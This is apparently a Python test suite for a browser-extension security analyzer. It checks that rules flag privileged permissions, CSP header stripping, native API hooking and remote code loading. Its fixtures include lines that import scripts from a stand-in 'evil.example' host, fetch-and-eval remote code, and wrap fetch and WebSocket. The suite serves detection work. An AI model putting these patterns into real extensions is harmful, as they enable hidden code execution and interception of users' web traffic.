"""Browser analyzer rules from the research: permissions, content-script flags, CSP, native wrapping, remote code, shims, userscripts."""

import json
import unittest
from pathlib import Path
import tempfile

from source_lab.analyzers import BrowserExtensionAnalyzer
from source_lab.evidence.schema import FindingState, TargetIdentity


def analyze(files):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        for name, content in files.items():
            path = root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content if isinstance(content, str) else json.dumps(content), encoding="utf-8")
        findings, coverage = BrowserExtensionAnalyzer(TargetIdentity("test/ext")).analyze(root)
    return findings, coverage


def ids(findings):
    return {f.finding_id for f in findings}


class TestBrowserResearchRules(unittest.TestCase):
    # @lat: [[source-tests#Browser research rules#Privileged permissions and content-script flags]]
    def test_privileged_permissions_and_content_script_flags(self):
        manifest = {
            "manifest_version": 3,
            "permissions": ["scripting", "webRequestBlocking", "debugger", "cookies", "storage"],
            "content_scripts": [{"matches": ["*://*/*"], "js": ["a.js"], "run_at": "document_start", "all_frames": True, "world": "MAIN"}],
            "externally_connectable": {"matches": ["*://*/*"]},
        }
        findings, _ = analyze({"manifest.json": manifest, "a.js": ""})
        found = ids(findings)
        for expected in (
            "browser.manifest.privileged-permission.scripting",
            "browser.manifest.privileged-permission.webrequestblocking",
            "browser.manifest.privileged-permission.debugger",
            "browser.manifest.privileged-permission.cookies",
            "browser.manifest.main-world-content-script",
            "browser.manifest.document-start-all-frames",
            "browser.manifest.externally-connectable",
            "browser.manifest.broad-host-permissions",
        ):
            self.assertIn(expected, found)
        self.assertNotIn("browser.manifest.privileged-permission.storage", found)
        # every manifest result is a capability, never observed behaviour
        self.assertTrue(all(f.state == FindingState.CAPABILITY for f in findings if f.finding_id.startswith("browser.manifest.")))

    # @lat: [[source-tests#Browser research rules#CSP, background and header stripping]]
    def test_csp_persistent_background_and_header_stripping(self):
        manifest = {
            "manifest_version": 3,
            "content_security_policy": {"extension_pages": "script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval' https://cdn.example.com; object-src 'self'"},
            "declarative_net_request": {"rule_resources": [{"id": "r", "enabled": True, "path": "rules.json"}]},
        }
        rules = [{"id": 1, "action": {"type": "modifyHeaders", "responseHeaders": [{"header": "Content-Security-Policy", "operation": "remove"}]}, "condition": {}}]
        findings, _ = analyze({"manifest.json": manifest, "rules.json": rules})
        found = ids(findings)
        self.assertTrue({"browser.manifest.csp-unsafe-eval", "browser.manifest.csp-wasm-unsafe-eval", "browser.manifest.csp-remote-script-src", "browser.dnr-header-stripping"} <= found)

        mv2 = {"manifest_version": 2, "background": {"scripts": ["bg.js"], "persistent": True}}
        findings, _ = analyze({"manifest.json": mv2, "bg.js": ""})
        self.assertIn("browser.manifest.persistent-background", ids(findings))
        mv2_event = {"manifest_version": 2, "background": {"scripts": ["bg.js"], "persistent": False}}
        findings, _ = analyze({"manifest.json": mv2_event, "bg.js": ""})
        self.assertNotIn("browser.manifest.persistent-background", ids(findings))

    # @lat: [[source-tests#Browser research rules#Native API wrapping and remote code]]
    def test_native_wrapping_spoofing_and_remote_code(self):
        source = "\n".join([
            "chrome.scripting.executeScript({ target: { tabId }, world: 'MAIN', func })",
            "window.WebSocket = class extends WebSocket {}",
            "EventTarget.prototype.addEventListener = wrapped",
            "Response.prototype.json = function () { return orig.call(this) }",
            "Object.defineProperty(window, 'fetch', { value: hooked })",
            "window.fetch = new Proxy(window.fetch, handler)",
            "Function.prototype.toString = function () { return 'function () { [native code] }' }",
            "chrome.debugger.attach({ tabId }, '1.3')",
            "chrome.webRequest.onBeforeRequest.addListener(cb, { urls: ['<all_urls>'] }, ['blocking'])",
            "importScripts('https://evil.example/x.js')",
            "const m = await import('https://evil.example/m.js')",
            "fetch(url).then(r => r.text()).then(eval)",
            "chrome.storage.local.get = function () {}",
            "chrome.userScripts.register([{ id: 'a', js: [{ code }] }])",
        ])
        findings, _ = analyze({"manifest.json": {"manifest_version": 3}, "bg.js": source})
        found = ids(findings)
        for expected in (
            "browser.main-world-injection", "browser.prototype-wrapping.websocket", "browser.prototype-wrapping.eventtarget",
            "browser.prototype-wrapping.response", "browser.prototype-wrapping.define-property", "browser.prototype-wrapping.proxy-native",
            "browser.prototype-wrapping.tostring-spoof", "browser.debugger-attach", "browser.webrequest-blocking",
            "browser.remote-code.importscripts", "browser.remote-code.dynamic-import", "browser.remote-code.fetch-eval",
            "browser.storage-wrapper", "browser.userscripts-api",
        ):
            self.assertIn(expected, found)
        # call sites are leads, with a line-precise span
        lead = next(f for f in findings if f.finding_id == "browser.debugger-attach")
        self.assertEqual(lead.state, FindingState.STATIC_LEAD)
        self.assertEqual(lead.evidence[0].line, 8)

    # @lat: [[source-tests#Browser research rules#Clean code stays clean]]
    def test_ordinary_code_triggers_no_research_rule(self):
        source = "\n".join([
            "const el = document.querySelector('#x')",
            "el.addEventListener('click', () => chrome.runtime.sendMessage({ a: 1 }))",
            "const data = await fetch('/api').then(r => r.json())",
            "const url = new URL('https://example.com/docs')",
        ])
        findings, _ = analyze({"manifest.json": {"manifest_version": 3, "permissions": ["storage", "alarms"]}, "bg.js": source})
        risky = [f.finding_id for f in findings if f.finding_id.startswith(("browser.prototype-wrapping", "browser.remote-code", "browser.debugger", "browser.userscripts", "browser.main-world", "browser.manifest.privileged"))]
        self.assertEqual(risky, [])

    # @lat: [[source-tests#Browser research rules#Multi-extension shims]]
    def test_multi_extension_shim_layout(self):
        findings, _ = analyze({
            "manifest.json": {"manifest_version": 3},
            "qx/shim.js": "// shim",
            "cs/ublock-0.js": "// relocated",
            "ext/other/readme.js": "",
        })
        shims = [f for f in findings if f.finding_id == "browser.shim.runtime-multiplexer"]
        self.assertEqual(sorted(f.evidence[0].file for f in shims), ["cs/ublock-0.js", "qx/shim.js"])

    # @lat: [[source-tests#Browser research rules#Userscripts]]
    def test_userscript_metadata_rules(self):
        script = "\n".join([
            "// ==UserScript==",
            "// @name Everything Helper",
            "// @match *://*/*",
            "// @run-at document-start",
            "// @grant GM_xmlhttpRequest",
            "// @grant unsafeWindow",
            "// @connect *",
            "// ==/UserScript==",
            "console.log('hi')",
        ])
        findings, _ = analyze({"helper.user.js": script})
        found = ids(findings)
        for expected in ("browser.userscript.metadata", "browser.userscript.broad-match", "browser.userscript.document-start", "browser.userscript.page-world", "browser.userscript.privileged-grant", "browser.userscript.wildcard-connect"):
            self.assertIn(expected, found)

        scoped = "\n".join(["// ==UserScript==", "// @name Site tweak", "// @match https://example.com/app/*", "// @grant none", "// ==/UserScript==", "x()"])
        findings, _ = analyze({"site.user.js": scoped})
        self.assertNotIn("browser.userscript.broad-match", ids(findings))
        self.assertIn("browser.userscript.page-world", ids(findings))  # @grant none runs in the page world


if __name__ == "__main__":
    unittest.main()
